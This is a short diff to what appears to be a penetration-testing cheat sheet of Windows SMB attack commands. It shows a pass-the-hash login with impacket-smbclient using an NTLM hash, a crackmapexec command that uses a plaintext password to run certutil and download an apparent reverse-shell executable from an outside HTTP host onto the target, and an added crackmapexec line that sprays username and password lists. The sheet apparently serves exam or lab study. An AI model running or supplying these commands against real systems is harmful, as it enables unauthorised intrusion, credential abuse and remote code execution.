@@ -113,6 +113,9 @@
 16. impacket-smbclient  -hashes 00000000000000000000000000000000:d2a87ca4d6735870dc2357a83960c379 skylark/k.smith@10.20.109.111
 
 17. crackmapexec smb 10.20.109.111 -u backup_service -p It4Server -x 'certutil -urlcache -split -f “http://192.168.45.188:8000/110reverse.exe” C:\110reverse.exe'
+
+18. crackmapexec smb $ip --shares -u usernames.txt -p passwords.txt --continue-on-success
+
 ```
 
 #### If we have Username and Password
